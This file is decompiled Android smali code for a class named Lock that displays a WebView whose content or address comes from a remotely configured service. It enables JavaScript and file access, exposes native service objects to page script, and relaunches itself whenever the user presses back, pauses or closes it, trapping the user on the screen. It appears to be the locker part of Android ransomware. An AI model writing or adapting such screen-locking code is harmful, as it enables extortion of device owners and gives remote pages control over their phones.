.class public Lorg/verywell/kernel/lck/Lock;
.super Landroid/app/Activity;
.source "Lock.java"


# static fields
.field private static _data:Ljava/lang/String;

.field private static _title:Ljava/lang/String;

.field private static _url:Ljava/lang/String;

.field public static web:Landroid/webkit/WebView;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .prologue
    .line 25
    const/4 v0, 0x0

    sput-object v0, Lorg/verywell/kernel/lck/Lock;->web:Landroid/webkit/WebView;

    .line 26
    const-string v0, "http://"

    sput-object v0, Lorg/verywell/kernel/lck/Lock;->_url:Ljava/lang/String;

    .line 27
    const-string v0, ""

    sput-object v0, Lorg/verywell/kernel/lck/Lock;->_data:Ljava/lang/String;

    .line 28
    const-string v0, ""

    sput-object v0, Lorg/verywell/kernel/lck/Lock;->_title:Ljava/lang/String;

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .prologue
    .line 23
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method

.method public static loadData(Ljava/lang/String;Ljava/lang/String;)V
    .locals 2
    .param p0, "data"    # Ljava/lang/String;
    .param p1, "mime"    # Ljava/lang/String;

    .prologue
    .line 109
    sget-object v0, Lorg/verywell/kernel/lck/Lock;->web:Landroid/webkit/WebView;

    const-string v1, "utf-8"

    invoke-virtual {v0, p0, p1, v1}, Landroid/webkit/WebView;->loadData(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 110
    return-void
.end method

.method public static loadURL(Ljava/lang/String;)V
    .locals 1
    .param p0, "url"    # Ljava/lang/String;

    .prologue
    .line 104
    sget-object v0, Lorg/verywell/kernel/lck/Lock;->web:Landroid/webkit/WebView;

    invoke-virtual {v0, p0}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    .line 105
    return-void
.end method

.method public static setData(Ljava/lang/String;)V
    .locals 0
    .param p0, "data"    # Ljava/lang/String;

    .prologue
    .line 119
    sput-object p0, Lorg/verywell/kernel/lck/Lock;->_data:Ljava/lang/String;

    .line 120
    return-void
.end method

.method public static setTitle(Ljava/lang/String;)V
    .locals 0
    .param p0, "title"    # Ljava/lang/String;

    .prologue
    .line 124
    sput-object p0, Lorg/verywell/kernel/lck/Lock;->_title:Ljava/lang/String;

    .line 125
    return-void
.end method

.method public static setURL(Ljava/lang/String;)V
    .locals 0
    .param p0, "url"    # Ljava/lang/String;

    .prologue
    .line 114
    sput-object p0, Lorg/verywell/kernel/lck/Lock;->_url:Ljava/lang/String;

    .line 115
    return-void
.end method


# virtual methods
.method public Launch(Ljava/lang/Boolean;)V
    .locals 3
    .param p1, "newtask"    # Ljava/lang/Boolean;

    .prologue
    .line 33
    invoke-static {}, Lorg/verywell/kernel/RunService;->getService()Lorg/verywell/kernel/RunService;

    move-result-object v1

    invoke-virtual {v1}, Lorg/verywell/kernel/RunService;->isLockerEnabled()Ljava/lang/Boolean;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-nez v1, :cond_0

    .line 43
    :goto_0
    return-void

    .line 35
    :cond_0
    new-instance v0, Landroid/content/Intent;

    invoke-static {}, Lorg/verywell/kernel/RunService;->getService()Lorg/verywell/kernel/RunService;

    move-result-object v1

    const-class v2, Lorg/verywell/kernel/lck/Lock;

    invoke-direct {v0, v1, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 36
    .local v0, "intent":Landroid/content/Intent;
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-eqz v1, :cond_1

    .line 38
    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 40
    :cond_1
    const/high16 v1, 0x4000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 41
    const/high16 v1, 0x20000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 42
    invoke-virtual {p0, v0}, Lorg/verywell/kernel/lck/Lock;->startActivity(Landroid/content/Intent;)V

    goto :goto_0
.end method

.method public onBackPressed()V
    .locals 1

    .prologue
    .line 142
    invoke-super {p0}, Landroid/app/Activity;->onBackPressed()V

    .line 143
    const/4 v0, 0x1

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {p0, v0}, Lorg/verywell/kernel/lck/Lock;->Launch(Ljava/lang/Boolean;)V

    .line 144
    return-void
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 4
    .param p1, "icicle"    # Landroid/os/Bundle;

    .prologue
    const/4 v3, 0x1

    .line 47
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 48
    const/high16 v1, 0x7f030000

    invoke-virtual {p0, v1}, Lorg/verywell/kernel/lck/Lock;->setContentView(I)V

    .line 50
    const/high16 v1, 0x7f070000

    invoke-virtual {p0, v1}, Lorg/verywell/kernel/lck/Lock;->findViewById(I)Landroid/view/View;

    move-result-object v1

    check-cast v1, Landroid/webkit/WebView;

    sput-object v1, Lorg/verywell/kernel/lck/Lock;->web:Landroid/webkit/WebView;

    .line 51
    sget-object v1, Lorg/verywell/kernel/lck/Lock;->web:Landroid/webkit/WebView;

    new-instance v2, Lorg/verywell/kernel/utilities/xWebClient;

    invoke-direct {v2}, Lorg/verywell/kernel/utilities/xWebClient;-><init>()V

    invoke-virtual {v1, v2}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V

    .line 52
    sget-object v1, Lorg/verywell/kernel/lck/Lock;->web:Landroid/webkit/WebView;

    new-instance v2, Lorg/verywell/kernel/utilities/xWebChromeClient;

    invoke-direct {v2}, Lorg/verywell/kernel/utilities/xWebChromeClient;-><init>()V

    invoke-virtual {v1, v2}, Landroid/webkit/WebView;->setWebChromeClient(Landroid/webkit/WebChromeClient;)V

    .line 53
    sget-object v1, Lorg/verywell/kernel/lck/Lock;->web:Landroid/webkit/WebView;

    invoke-virtual {v1, v3}, Landroid/webkit/WebView;->clearCache(Z)V

    .line 54
    sget-object v1, Lorg/verywell/kernel/lck/Lock;->web:Landroid/webkit/WebView;

    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v1

    invoke-virtual {v1, v3}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    .line 55
    sget-object v1, Lorg/verywell/kernel/lck/Lock;->web:Landroid/webkit/WebView;

    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v1

    invoke-virtual {v1, v3}, Landroid/webkit/WebSettings;->setAllowFileAccess(Z)V

    .line 56
    sget-object v1, Lorg/verywell/kernel/lck/Lock;->web:Landroid/webkit/WebView;

    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v1

    invoke-virtual {v1, v3}, Landroid/webkit/WebSettings;->setUseWideViewPort(Z)V

    .line 57
    sget-object v1, Lorg/verywell/kernel/lck/Lock;->web:Landroid/webkit/WebView;

    invoke-virtual {v1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v1

    const/4 v2, 0x0

    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setBuiltInZoomControls(Z)V

    .line 59
    sget-object v1, Lorg/verywell/kernel/lck/Lock;->web:Landroid/webkit/WebView;

    invoke-virtual {v1, v3}, Landroid/webkit/WebView;->setVerticalScrollBarEnabled(Z)V

    .line 60
    sget-object v1, Lorg/verywell/kernel/lck/Lock;->web:Landroid/webkit/WebView;

    invoke-virtual {v1, v3}, Landroid/webkit/WebView;->setHorizontalScrollBarEnabled(Z)V

    .line 62
    sget-object v1, Lorg/verywell/kernel/lck/Lock;->web:Landroid/webkit/WebView;

    new-instance v2, Lorg/verywell/kernel/utilities/xWebAPI;

    sget-object v3, Lorg/verywell/kernel/lck/Lock;->web:Landroid/webkit/WebView;

    invoke-direct {v2, p0, v3, p0}, Lorg/verywell/kernel/utilities/xWebAPI;-><init>(Landroid/content/Context;Landroid/webkit/WebView;Landroid/app/Activity;)V

    const-string v3, "WebAPI"

    invoke-virtual {v1, v2, v3}, Landroid/webkit/WebView;->addJavascriptInterface(Ljava/lang/Object;Ljava/lang/String;)V

    .line 63
    sget-object v1, Lorg/verywell/kernel/lck/Lock;->web:Landroid/webkit/WebView;

    invoke-static {}, Lorg/verywell/kernel/RunService;->getService()Lorg/verywell/kernel/RunService;

    move-result-object v2

    invoke-virtual {v2}, Lorg/verywell/kernel/RunService;->getAPI()Lorg/verywell/kernel/xAPI;

    move-result-object v2

    const-string v3, "xAPI"

    invoke-virtual {v1, v2, v3}, Landroid/webkit/WebView;->addJavascriptInterface(Ljava/lang/Object;Ljava/lang/String;)V

    .line 64
    sget-object v1, Lorg/verywell/kernel/lck/Lock;->web:Landroid/webkit/WebView;

    new-instance v2, Lorg/verywell/kernel/Consts;

    invoke-direct {v2}, Lorg/verywell/kernel/Consts;-><init>()V

    const-string v3, "Consts"

    invoke-virtual {v1, v2, v3}, Landroid/webkit/WebView;->addJavascriptInterface(Ljava/lang/Object;Ljava/lang/String;)V

    .line 65
    sget-object v1, Lorg/verywell/kernel/lck/Lock;->web:Landroid/webkit/WebView;

    invoke-static {}, Lorg/verywell/kernel/RunService;->getService()Lorg/verywell/kernel/RunService;

    move-result-object v2

    const-string v3, "Service"

    invoke-virtual {v1, v2, v3}, Landroid/webkit/WebView;->addJavascriptInterface(Ljava/lang/Object;Ljava/lang/String;)V

    .line 67
    invoke-static {}, Lorg/verywell/kernel/RunService;->getService()Lorg/verywell/kernel/RunService;

    move-result-object v0

    .line 69
    .local v0, "svc":Lorg/verywell/kernel/RunService;
    sget-object v1, Lorg/verywell/kernel/Consts;->locker:Ljava/lang/Boolean;

    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-eqz v1, :cond_0

    invoke-virtual {v0}, Lorg/verywell/kernel/RunService;->isLockerEnabled()Ljava/lang/Boolean;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-eqz v1, :cond_0

    .line 71
    invoke-virtual {v0}, Lorg/verywell/kernel/RunService;->isLockerContentData()Ljava/lang/Boolean;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v1

    if-eqz v1, :cond_1

    .line 73
    invoke-virtual {v0}, Lorg/verywell/kernel/RunService;->getLockerContent()Ljava/lang/String;

    move-result-object v1

    sput-object v1, Lorg/verywell/kernel/lck/Lock;->_data:Ljava/lang/String;

    .line 89
    :cond_0
    :goto_0
    sget-object v1, Lorg/verywell/kernel/lck/Lock;->_data:Ljava/lang/String;

    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v1

    if-nez v1, :cond_3

    .line 91
    sget-object v1, Lorg/verywell/kernel/lck/Lock;->_url:Ljava/lang/String;

    invoke-static {v1}, Lorg/verywell/kernel/lck/Lock;->loadURL(Ljava/lang/String;)V

    .line 98
    :goto_1
    sget-object v1, Lorg/verywell/kernel/lck/Lock;->_title:Ljava/lang/String;

    invoke-super {p0, v1}, Landroid/app/Activity;->setTitle(Ljava/lang/CharSequence;)V

    .line 100
    return-void

    .line 77
    :cond_1
    invoke-virtual {v0}, Lorg/verywell/kernel/RunService;->getLockerContent()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v1

    if-eqz v1, :cond_2

    .line 79
    invoke-virtual {v0}, Lorg/verywell/kernel/RunService;->getLockerContent()Ljava/lang/String;

    move-result-object v1

    sput-object v1, Lorg/verywell/kernel/lck/Lock;->_url:Ljava/lang/String;

    goto :goto_0

    .line 83
    :cond_2
    sget-object v1, Lorg/verywell/kernel/Consts;->lockerAddress:Ljava/lang/String;

    sput-object v1, Lorg/verywell/kernel/lck/Lock;->_url:Ljava/lang/String;

    goto :goto_0

    .line 95
    :cond_3
    sget-object v1, Lorg/verywell/kernel/lck/Lock;->_data:Ljava/lang/String;

    const-string v2, "text/html"

    invoke-static {v1, v2}, Lorg/verywell/kernel/lck/Lock;->loadData(Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_1
.end method

.method protected onDestroy()V
    .locals 4

    .prologue
    .line 148
    invoke-static {}, Lorg/verywell/kernel/RunService;->getService()Lorg/verywell/kernel/RunService;

    sget-object v0, Lorg/verywell/kernel/RunService;->onTickHandler:Landroid/os/Handler;

    const/16 v1, 0x22b

    const-wide/16 v2, 0x7d0

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->sendEmptyMessageDelayed(IJ)Z

    .line 149
    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    .line 150
    const/4 v0, 0x1

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {p0, v0}, Lorg/verywell/kernel/lck/Lock;->Launch(Ljava/lang/Boolean;)V

    .line 151
    return-void
.end method

.method protected onPause()V
    .locals 4

    .prologue
    .line 135
    invoke-static {}, Lorg/verywell/kernel/RunService;->getService()Lorg/verywell/kernel/RunService;

    sget-object v0, Lorg/verywell/kernel/RunService;->onTickHandler:Landroid/os/Handler;

    const/16 v1, 0x22b

    const-wide/16 v2, 0x7d0

    invoke-virtual {v0, v1, v2, v3}, Landroid/os/Handler;->sendEmptyMessageDelayed(IJ)Z

    .line 136
    invoke-super {p0}, Landroid/app/Activity;->onPause()V

    .line 137
    const/4 v0, 0x1

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {p0, v0}, Lorg/verywell/kernel/lck/Lock;->Launch(Ljava/lang/Boolean;)V

    .line 138
    return-void
.end method

.method protected onStart()V
    .locals 1

    .prologue
    .line 129
    invoke-super {p0}, Landroid/app/Activity;->onStart()V

    .line 130
    const/4 v0, 0x0

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {p0, v0}, Lorg/verywell/kernel/lck/Lock;->Launch(Ljava/lang/Boolean;)V

    .line 131
    return-void
.end method
